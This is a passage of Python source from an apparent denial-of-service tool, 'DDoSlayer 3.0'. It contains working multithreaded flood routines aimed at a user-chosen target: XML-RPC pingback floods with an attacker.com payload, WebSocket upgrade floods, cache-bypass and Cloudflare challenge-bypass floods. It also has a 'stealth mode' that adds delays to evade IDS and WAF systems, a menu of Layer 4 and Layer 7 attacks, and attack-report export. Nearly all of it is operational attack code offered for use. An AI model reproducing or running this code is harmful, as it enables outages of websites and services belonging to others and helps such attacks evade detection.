        console.print(f"\n[cyan][*] Starting Cache Bypass with {threads} threads...[/cyan]")
        console.print(f"[yellow][*] Target: {target_url}[/yellow]")
    else:
        print(colored(f"\n[*] Starting Cache Bypass with {threads} threads...", 'cyan'))
        print(colored(f"[*] Target: {target_url}", 'yellow'))
    
    thread_list = []
    for i in range(threads):
        t = threading.Thread(target=cache_bypass_thread, args=(target_url, duration, stealth))
        t.daemon = True
        t.start()
        thread_list.append(t)
    
    attack_start_time = time.time()
    display_attack_progress(duration, "CACHE BYPASS")
    
    for t in thread_list:
        t.join()
    
    return generate_attack_summary("Cache Bypass", target_url, None, duration, threads, stealth)

def xmlrpc_flood_thread(target_url, duration, stealth=False):
    """XML-RPC flood attack"""
    global packets_sent, packets_failed, stop_attack
    
    if not REQUESTS_AVAILABLE:
        return
    
    timeout = time.time() + duration
    session = requests.Session()
    
    xml_payload = '''<?xml version="1.0" encoding="UTF-8"?>
<methodCall>
<methodName>pingback.ping</methodName>
<params>
<param><value><string>http://attacker.com/</string></value></param>
<param><value><string>{}</string></value></param>
</params>
</methodCall>'''
    
    while time.time() < timeout and not stop_attack:
        try:
            headers = get_random_headers()
            headers['Content-Type'] = 'text/xml'
            payload = xml_payload.format(f"{target_url}?p={random.randint(1, 1000)}")
            response = session.post(target_url, data=payload, headers=headers, timeout=2, verify=False)
            
            with packets_lock:
                packets_sent += 1
            
            if stealth:
                time.sleep(random.uniform(0.1, 2.0))
        except Exception as e:
            with packets_lock:
                packets_failed += 1

def xmlrpc_flood(target_url, duration, threads=50, stealth=False):
    """XML-RPC flood attack launcher"""
    global packets_sent, packets_failed, stop_attack, attack_start_time, peak_rate
    packets_sent = 0
    packets_failed = 0
    stop_attack = False
    peak_rate = 0
    
    if not REQUESTS_AVAILABLE:
        if RICH_AVAILABLE:
            console.print("[red][!] Requests library required[/red]")
        else:
            print(colored("[!] Requests library required", 'red'))
        return None
    
    if not target_url.endswith('xmlrpc.php'):
        target_url = target_url.rstrip('/') + '/xmlrpc.php'
    
    if RICH_AVAILABLE:
        console.print(f"\n[cyan][*] Starting XML-RPC flood with {threads} threads...[/cyan]")
        console.print(f"[yellow][*] Target: {target_url}[/yellow]")
    else:
        print(colored(f"\n[*] Starting XML-RPC flood with {threads} threads...", 'cyan'))
        print(colored(f"[*] Target: {target_url}", 'yellow'))
    
    thread_list = []
    for i in range(threads):
        t = threading.Thread(target=xmlrpc_flood_thread, args=(target_url, duration, stealth))
        t.daemon = True
        t.start()
        thread_list.append(t)
    
    attack_start_time = time.time()
    display_attack_progress(duration, "XML-RPC FLOOD")
    
    for t in thread_list:
        t.join()
    
    return generate_attack_summary("XML-RPC Flood", target_url, None, duration, threads, stealth)

def websocket_flood_thread(target_url, duration, stealth=False):
    """WebSocket flood attack"""
    global packets_sent, packets_failed, stop_attack
    
    if not REQUESTS_AVAILABLE:
        return
    
    timeout = time.time() + duration
    
    while time.time() < timeout and not stop_attack:
        try:
            headers = get_random_headers()
            headers['Upgrade'] = 'websocket'
            headers['Connection'] = 'Upgrade'
            headers['Sec-WebSocket-Version'] = '13'
            headers['Sec-WebSocket-Key'] = 'dGhlIHNhbXBsZSBub25jZQ=='
            
            session = requests.Session()
            response = session.get(target_url, headers=headers, timeout=2, verify=False)
            
            with packets_lock:
                packets_sent += 1
            
            if stealth:
                time.sleep(random.uniform(0.1, 2.0))
        except Exception as e:
            with packets_lock:
                packets_failed += 1

def websocket_flood(target_url, duration, threads=100, stealth=False):
    """WebSocket flood attack launcher"""
    global packets_sent, packets_failed, stop_attack, attack_start_time, peak_rate
    packets_sent = 0
    packets_failed = 0
    stop_attack = False
    peak_rate = 0
    
    if not REQUESTS_AVAILABLE:
        if RICH_AVAILABLE:
            console.print("[red][!] Requests library required[/red]")
        else:
            print(colored("[!] Requests library required", 'red'))
        return None
    
    if RICH_AVAILABLE:
        console.print(f"\n[cyan][*] Starting WebSocket flood with {threads} threads...[/cyan]")
        console.print(f"[yellow][*] Target: {target_url}[/yellow]")
    else:
        print(colored(f"\n[*] Starting WebSocket flood with {threads} threads...", 'cyan'))
        print(colored(f"[*] Target: {target_url}", 'yellow'))
    
    thread_list = []
    for i in range(threads):
        t = threading.Thread(target=websocket_flood_thread, args=(target_url, duration, stealth))
        t.daemon = True
        t.start()
        thread_list.append(t)
    
    attack_start_time = time.time()
    display_attack_progress(duration, "WEBSOCKET FLOOD")
    
    for t in thread_list:
        t.join()
    
    return generate_attack_summary("WebSocket Flood", target_url, None, duration, threads, stealth)

def cf_uam_bypass_thread(target_url, duration, stealth=False):
    """Cloudflare UAM bypass"""
    global packets_sent, packets_failed, stop_attack
    
    if not REQUESTS_AVAILABLE:
        return
    
    timeout = time.time() + duration
    session = requests.Session()
    
    while time.time() < timeout and not stop_attack:
        try:
            headers = get_random_headers()
            headers['Accept'] = 'text/html,application/xhtml+xml'
            random_url = f"{target_url}?cf_bypass={random.randint(1000000, 9999999)}"
            response = session.get(random_url, headers=headers, timeout=3, verify=False, allow_redirects=True)
            
            with packets_lock:
                packets_sent += 1
            
            if stealth:
                time.sleep(random.uniform(0.5, 3.0))
        except Exception as e:
            with packets_lock:
                packets_failed += 1

def cf_uam_bypass(target_url, duration, threads=80, stealth=False):
    """Cloudflare UAM bypass launcher"""
    global packets_sent, packets_failed, stop_attack, attack_start_time, peak_rate
    packets_sent = 0
    packets_failed = 0
    stop_attack = False
    peak_rate = 0
    
    if not REQUESTS_AVAILABLE:
        if RICH_AVAILABLE:
            console.print("[red][!] Requests library required[/red]")
        else:
            print(colored("[!] Requests library required", 'red'))
        return None
    
    if RICH_AVAILABLE:
        console.print(f"\n[cyan][*] Starting CF UAM Bypass with {threads} threads...[/cyan]")
        console.print(f"[yellow][*] Target: {target_url}[/yellow]")
    else:
        print(colored(f"\n[*] Starting CF UAM Bypass with {threads} threads...", 'cyan'))
        print(colored(f"[*] Target: {target_url}", 'yellow'))
    
    thread_list = []
    for i in range(threads):
        t = threading.Thread(target=cf_uam_bypass_thread, args=(target_url, duration, stealth))
        t.daemon = True
        t.start()
        thread_list.append(t)
    
    attack_start_time = time.time()
    display_attack_progress(duration, "CF UAM BYPASS")
    
    for t in thread_list:
        t.join()
    
    return generate_attack_summary("CF UAM Bypass", target_url, None, duration, threads, stealth)

# ==================== ATTACK PROGRESS ====================
def display_attack_progress(duration, attack_name):
    """Display live attack progress"""
    global packets_sent, packets_failed, stop_attack, attack_start_time, peak_rate
    
    last_count = 0
    
    if RICH_AVAILABLE:
        with Progress(
            TextColumn("[progress.description]{task.description}"),
            BarColumn(),
            TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
            console=console
        ) as progress:
            
            task = progress.add_task(f"[cyan]{attack_name}", total=duration)
            
            try:
                while not progress.finished:
                    elapsed = int(time.time() - attack_start_time)
                    
                    if elapsed >= duration or stop_attack:
                        progress.update(task, completed=duration)
                        break
                    
                    current_rate = packets_sent - last_count
                    last_count = packets_sent
                    
                    if current_rate > peak_rate:
                        peak_rate = current_rate
                    
                    total_attempts = packets_sent + packets_failed
                    success_rate = (packets_sent / total_attempts * 100) if total_attempts > 0 else 0
                    
                    progress.update(
                        task,
                        completed=elapsed,
                        description=f"[cyan]{attack_name} [white]| Packets: {packets_sent:,} | Rate: {current_rate}/s | Success: {success_rate:.1f}%"
                    )
                    
                    time.sleep(1)
                    
            except KeyboardInterrupt:
                console.print("\n[red][!] Attack stopped by user[/red]")
                stop_attack = True
    else:
        # Fallback without Rich
        try:
            while time.time() - attack_start_time < duration and not stop_attack:
                elapsed = int(time.time() - attack_start_time)
                remaining = duration - elapsed
                progress = int((elapsed / duration) * 40)
                
                current_rate = packets_sent - last_count
                last_count = packets_sent
                
                if current_rate > peak_rate:
                    peak_rate = current_rate
                
                total_attempts = packets_sent + packets_failed
                success_rate = (packets_sent / total_attempts * 100) if total_attempts > 0 else 0
                
                bar = '█' * progress + '░' * (40 - progress)
                percent = int((elapsed / duration) * 100)
                
                print(f'\r[{colored(bar, "green")}] {percent}% | Packets: {packets_sent} | Rate: {current_rate}/s', end='', flush=True)
                
                time.sleep(1)
                
        except KeyboardInterrupt:
            print(colored("\n[!] Attack stopped by user", 'red'))
            stop_attack = True
    
    print("\n")

# ==================== ATTACK SUMMARY ====================
def generate_attack_summary(attack_type, target, port, duration, threads, stealth):
    """Generate attack summary statistics"""
    global packets_sent, packets_failed, peak_rate, attack_start_time
    
    total_attempts = packets_sent + packets_failed
    success_rate = (packets_sent / total_attempts * 100) if total_attempts > 0 else 0
    actual_duration = time.time() - attack_start_time
    avg_rate = int(packets_sent / actual_duration) if actual_duration > 0 else 0
    
    summary = {
        'attack_id': f"attack_{datetime.now().strftime('%Y%m%d_%H%M%S')}",
        'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
        'attack_type': attack_type,
        'target': target,
        'port': port,
        'duration': duration,
        'actual_duration': round(actual_duration, 2),
        'threads': threads,
        'stealth_mode': stealth,
        'results': {
            'packets_sent': packets_sent,
            'packets_failed': packets_failed,
            'total_attempts': total_attempts,
            'success_rate': round(success_rate, 2),
            'avg_rate': avg_rate,
            'peak_rate': peak_rate
        }
    }
    
    display_attack_summary(summary)
    
    return summary

def display_attack_summary(summary):
    """Display formatted attack summary"""
    
    if RICH_AVAILABLE:
        summary_table = Table(title="ATTACK COMPLETED", box=box.DOUBLE_EDGE, border_style="green")
        summary_table.add_column("Metric", style="cyan", width=20)
        summary_table.add_column("Value", style="white", width=30)
        
        summary_table.add_row("Total Packets", f"{summary['results']['packets_sent']:,}")
        summary_table.add_row("Success Rate", f"{summary['results']['success_rate']}%")
        summary_table.add_row("Failed Requests", f"{summary['results']['packets_failed']:,}")
        summary_table.add_row("Avg Rate", f"{summary['results']['avg_rate']:,}/sec")
        summary_table.add_row("Peak Rate", f"{summary['results']['peak_rate']:,}/sec")
        summary_table.add_row("Duration", f"{summary['actual_duration']}s")
        
        console.print(summary_table)
    else:
        print(colored("\n" + "=" * 60, 'green'))
        print(colored("ATTACK COMPLETED", 'green'))
        print(colored("=" * 60, 'green'))
        print(colored(f"Total Packets:    {summary['results']['packets_sent']:,}", 'white'))
        print(colored(f"Success Rate:     {summary['results']['success_rate']}%", 'white'))
        print(colored(f"Failed Requests:  {summary['results']['packets_failed']:,}", 'white'))
        print(colored(f"Avg Rate:         {summary['results']['avg_rate']:,}/sec", 'white'))
        print(colored(f"Peak Rate:        {summary['results']['peak_rate']:,}/sec", 'white'))
        print(colored(f"Duration:         {summary['actual_duration']}s", 'white'))
        print(colored("=" * 60 + "\n", 'green'))

# ==================== LOG EXPORT ====================
def export_log_json(summary):
    """Export attack log as JSON"""
    os.makedirs('logs', exist_ok=True)
    filename = f"logs/{summary['attack_id']}.json"
    
    with open(filename, 'w') as f:
        json.dump(summary, f, indent=2)
    
    if RICH_AVAILABLE:
        console.print(f"[green][+] JSON log saved: {filename}[/green]")
    else:
        print(colored(f"[+] JSON log saved: {filename}", 'green'))
    return filename

def export_log_markdown(summary):
    """Export attack log as Markdown"""
    os.makedirs('logs', exist_ok=True)
    filename = f"logs/{summary['attack_id']}.md"
    
    markdown = f"""# DDoSlayer 3.0 Attack Report - by blackhatethicalhacking.com

**Attack ID:** {summary['attack_id']}  
**Date:** {summary['timestamp']}

## Configuration

- **Attack Type:** {summary['attack_type']}
- **Target:** {summary['target']}
- **Port:** {summary['port'] if summary['port'] else 'N/A'}
- **Duration:** {summary['duration']}s (actual: {summary['actual_duration']}s)
- **Threads:** {summary['threads']}
- **Stealth Mode:** {'Enabled' if summary['stealth_mode'] else 'Disabled'}

## Results

- **Total Packets Sent:** {summary['results']['packets_sent']:,}
- **Failed Attempts:** {summary['results']['packets_failed']:,}
- **Success Rate:** {summary['results']['success_rate']}%
- **Average Rate:** {summary['results']['avg_rate']:,} packets/sec
- **Peak Rate:** {summary['results']['peak_rate']:,} packets/sec

---
*Generated by DDoSlayer 3.0 Ultimate Edition*
"""
    
    with open(filename, 'w') as f:
        f.write(markdown)
    
    if RICH_AVAILABLE:
        console.print(f"[green][+] Markdown report saved: {filename}[/green]")
    else:
        print(colored(f"[+] Markdown report saved: {filename}", 'green'))
    return filename

def export_logs_menu(summary):
    """Display export options menu"""
    
    if RICH_AVAILABLE:
        console.print("\n[cyan][1][/cyan] JSON Format")
        console.print("[cyan][2][/cyan] Markdown Report")
        console.print("[cyan][3][/cyan] Both Formats")
        console.print("[cyan][4][/cyan] Skip Export\n")
    else:
        print(colored("\n[1] JSON  [2] Markdown  [3] Both  [4] Skip\n", 'cyan'))
    
    choice = input(colored("Select export option: ", 'yellow'))
    
    if choice == '1':
        export_log_json(summary)
    elif choice == '2':
        export_log_markdown(summary)
    elif choice == '3':
        export_log_json(summary)
        export_log_markdown(summary)
    elif choice == '4':
        if RICH_AVAILABLE:
            console.print("[yellow][*] Export skipped[/yellow]")
        else:
            print(colored("[*] Export skipped", 'yellow'))
    else:
        if RICH_AVAILABLE:
            console.print("[red][!] Invalid option[/red]")
        else:
            print(colored("[!] Invalid option", 'red'))

# ==================== MAIN MENU ====================
def display_main_menu():
    """Display main menu"""
    
    if RICH_AVAILABLE:
        menu_text = "[bold hot_pink]DDoSlayer V3.0 Ultimate Edition ATTACK FRAMEWORK[/bold hot_pink]\n\n"
        menu_text += "[cyan][0][/cyan] [green]Auto-Detect Mode: Detect, Analyse & Strike[/green]\n"
        menu_text += "    [white]Scans ports, fingerprints services, detects CDN/WAF,[/white]\n"
        menu_text += "    [white]identifies weaknesses, recommends optimal attack[/white]\n\n"
        menu_text += "[yellow]MANUAL ATTACK SELECTION:[/yellow]\n\n"
        menu_text += "[white]Layer 4 Attacks:[/white]\n"
        menu_text += "[cyan][1][/cyan] UDP Flood          [cyan][2][/cyan] SYN Flood\n\n"
        menu_text += "[white]Layer 7 Attacks:[/white]\n"
        menu_text += "[cyan][3][/cyan] HTTP Flood         [cyan][7][/cyan] Cache Bypass\n"
        menu_text += "[cyan][4][/cyan] HTTP/2 Flood       [cyan][8][/cyan] XML-RPC Flood\n"
        menu_text += "[cyan][5][/cyan] Slowloris          [cyan][9][/cyan] WebSocket Flood\n"
        menu_text += "[cyan][6][/cyan] Slow POST          [cyan][10][/cyan] CF UAM Bypass\n\n"
        menu_text += "[cyan][11][/cyan] View Attack Logs   [cyan][12][/cyan] Exit"
        
        menu_panel = Panel(menu_text, border_style="cyan", box=box.DOUBLE)
        console.print(menu_panel)
    else:
        print(colored("\n" + "=" * 60, 'cyan'))
        print(colored("         DDoSlayer V3.0 Ultimate Edition ATTACK FRAMEWORK", 'hot_pink'))
        print(colored("=" * 60, 'cyan'))
        print(colored("[0] Auto-Detect Mode: Detect, Analyse & Strike", 'green'))
        print(colored("    Scans ports, detects CDN, recommends attack", 'white'))
        print(colored("-" * 60, 'cyan'))
        print(colored("MANUAL ATTACK SELECTION:", 'yellow'))
        print()
        print(colored("Layer 4:", 'white'))
        print(colored("[1] UDP Flood        [2] SYN Flood", 'cyan'))
        print()
        print(colored("Layer 7:", 'white'))
        print(colored("[3] HTTP Flood       [7] Cache Bypass", 'cyan'))
        print(colored("[4] HTTP/2 Flood     [8] XML-RPC Flood", 'cyan'))
        print(colored("[5] Slowloris        [9] WebSocket Flood", 'cyan'))
        print(colored("[6] Slow POST        [10] CF UAM Bypass", 'cyan'))
        print(colored("-" * 60, 'cyan'))
        print(colored("[11] View Logs       [12] Exit", 'cyan'))
        print(colored("=" * 60 + "\n", 'cyan'))

def view_logs():
    """Display available logs"""
    if not os.path.exists('logs'):
        if RICH_AVAILABLE:
            console.print("\n[red][!] No logs directory found[/red]")
        else:
            print(colored("\n[!] No logs directory found", 'red'))
        return
    
    log_files = [f for f in os.listdir('logs') if f.endswith('.json') or f.endswith('.md')]
    
    if not log_files:
        if RICH_AVAILABLE:
            console.print("\n[red][!] No log files found[/red]")
        else:
            print(colored("\n[!] No log files found", 'red'))
        return
    
    if RICH_AVAILABLE:
        log_table = Table(title="ATTACK LOGS", box=box.DOUBLE_EDGE, border_style="cyan")
        log_table.add_column("№", style="cyan", width=5)
        log_table.add_column("Filename", style="white", width=50)
        
        for i, log_file in enumerate(log_files[:10], 1):
            log_table.add_row(str(i), log_file)
        
        console.print(log_table)
        console.print(f"\n[yellow][*] Total logs: {len(log_files)}[/yellow]")
        console.print(f"[yellow][*] Location: ./logs/[/yellow]")
    else:
        print(colored("\n" + "=" * 60, 'cyan'))
        print(colored("ATTACK LOGS", 'green'))
        print(colored("=" * 60, 'cyan'))
        
        for i, log_file in enumerate(log_files[:10], 1):
            print(colored(f"[{i}] {log_file}", 'white'))
        
        print(colored("=" * 60, 'cyan'))
        print(colored(f"\n[*] Total logs: {len(log_files)}", 'yellow'))
        print(colored(f"[*] Location: ./logs/", 'yellow'))

def get_stealth_mode():
    """Prompt user for stealth mode"""
    if RICH_AVAILABLE:
        stealth_info = "[yellow]STEALTH MODE[/yellow]\n\n"
        stealth_info += "[white]Adds random delays (0.1-2s) between requests to mimic[/white]\n"
        stealth_info += "[white]human behavior. Harder to detect but reduces speed by 50-70%.[/white]\n"
        stealth_info += "[white]Useful against IDS/WAF systems.[/white]"
        
        console.print(Panel(stealth_info, border_style="yellow", box=box.ROUNDED))
    else:
        print(colored("\nSTEALTH MODE:", 'yellow'))
        print(colored("Adds delays to mimic human behavior.", 'white'))
        print(colored("Reduces speed but harder to detect.\n", 'white'))
    
    choice = input(colored("Enable Stealth Mode? [y/n]: ", 'green')).lower()
    return choice == 'y'

def launch_attack(attack_type, url, ip, port, duration, threads, stealth):
    """Launch the selected attack"""
    
    if attack_type == 1:
        return udp_flood(ip, port, duration, threads, stealth)
    elif attack_type == 2:
        return syn_flood(ip, port, duration, threads, stealth)
    elif attack_type == 3:
        return http_flood(ip, port, duration, threads, "/", stealth)
    elif attack_type == 4:
        return http2_flood(url, duration, threads, stealth)
    elif attack_type == 5:
        return slowloris(ip, port, duration, threads, stealth)
    elif attack_type == 6:
        return slow_post(ip, port, duration, threads, stealth)
    elif attack_type == 7:
        return cache_bypass(url, duration, threads, stealth)
    elif attack_type == 8:
        return xmlrpc_flood(url, duration, threads, stealth)
    elif attack_type == 9:
        return websocket_flood(url, duration, threads, stealth)
    elif attack_type == 10:
        return cf_uam_bypass(url, duration, threads, stealth)
    else:
        if RICH_AVAILABLE:
            console.print("[red][!] Invalid attack type[/red]")
        else:
            print(colored("[!] Invalid attack type", 'red'))
        return None

def main():
    """Main function"""
    
    print_banner()
    
    while True:
        display_main_menu()
        
        choice = input(colored("\nSelect option: ", 'yellow'))
        
        if choice == '0':
            # AUTO MODE
            target = input(colored("\n[AUTO MODE] Enter target URL or IP: ", 'green'))
            
            if not target:
                if RICH_AVAILABLE:
                    console.print("[red][!] Target cannot be empty[/red]")
                else:
                    print(colored("[!] Target cannot be empty", 'red'))
                continue
            
            try:
                duration = int(input(colored("[AUTO MODE] Attack duration (seconds): ", 'green')))
            except ValueError:
                if RICH_AVAILABLE:
                    console.print("[red][!] Invalid duration[/red]")
                else:
                    print(colored("[!] Invalid duration", 'red'))
                continue
            
            stealth = get_stealth_mode()
            
            scan_results = auto_scan_target(target)
            
            if not scan_results:
                input(colored("\nPress Enter to return to menu...", 'yellow'))
                continue
            
            recommendation = recommend_attack(scan_results)
            display_scan_results(scan_results, recommendation)
            
            auto_choice = input(colored("\nYour choice: ", 'yellow'))
            
            if auto_choice == '1' and recommendation:
                attack_type = recommendation['attack_id']
                threads = recommendation['threads']
                target_url = scan_results['url']
                target_ip = scan_results['ip']
                target_port = scan_results['open_ports'][0] if scan_results['open_ports'] else 80
                
                summary = launch_attack(attack_type, target_url, target_ip, target_port, duration, threads, stealth)
                
                if summary:
                    export_logs_menu(summary)
                
                input(colored("\nPress Enter to return to menu...", 'yellow'))
                
            elif auto_choice == '2':
                continue
                
            elif auto_choice == '3':
                continue
            else:
                if RICH_AVAILABLE:
                    console.print("[red][!] Invalid choice[/red]")
                else:
                    print(colored("[!] Invalid choice", 'red'))
                input(colored("\nPress Enter to return to menu...", 'yellow'))
        
        elif choice in ['1', '2', '3', '4', '5', '6', '7', '8', '9', '10']:
            attack_type = int(choice)
            
            target = input(colored("\nEnter target URL or IP: ", 'green'))
            
            if not target:
                if RICH_AVAILABLE:
                    console.print("[red][!] Target cannot be empty[/red]")
                else:
                    print(colored("[!] Target cannot be empty", 'red'))
                continue
            
            ip, port, scheme, url = resolve_target(target)
            
            if not ip:
                continue
            
            if not port and attack_type in [1, 2]:
                try:
                    port = int(input(colored("Enter target port: ", 'green')))
                except ValueError:
                    if RICH_AVAILABLE:
                        console.print("[red][!] Invalid port[/red]")
                    else:
                        print(colored("[!] Invalid port", 'red'))
                    continue
            elif not port:
                port = 443 if scheme == 'https' else 80
            
            try:
                duration = int(input(colored("Attack duration (seconds): ", 'green')))
            except ValueError:
                if RICH_AVAILABLE:
                    console.print("[red][!] Invalid duration[/red]")
                else:
                    print(colored("[!] Invalid duration", 'red'))
                continue
            
            try:
                threads = int(input(colored("Number of threads (default 50): ", 'green')) or "50")
            except ValueError:
                threads = 50
            
            stealth = get_stealth_mode()
            
            summary = launch_attack(attack_type, url if url else f"http://{ip}", ip, port, duration, threads, stealth)
            
            if summary:
                export_logs_menu(summary)
            
            input(colored("\nPress Enter to return to menu...", 'yellow'))
        
        elif choice == '11':
            view_logs()
            input(colored("\nPress Enter to return to menu...", 'yellow'))
        
        elif choice == '12':
            if RICH_AVAILABLE:
                console.print("\n[yellow][*] Exiting DDoSlayer...[/yellow]")
                console.print("[hot_pink]Stay safe and hack the planet ![/hot_pink]\n")
            else:
                print(colored("\n[*] Exiting DDoSlayer...", 'yellow'))
                print(colored("Stay safe and hack the planet ethically!\n", 'hot_pink'))
            sys.exit(0)
        
        else:
            if RICH_AVAILABLE:
                console.print("\n[red][!] Invalid option[/red]")
            else:
                print(colored("\n[!] Invalid option", 'red'))
            input(colored("Press Enter to continue...", 'yellow'))

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        if RICH_AVAILABLE:
            console.print("\n\n[red][!] Program interrupted by user. Exiting...[/red]")
        else:
            print(colored("\n\n[!] Program interrupted by user. Exiting...", 'red'))
        sys.exit(0)
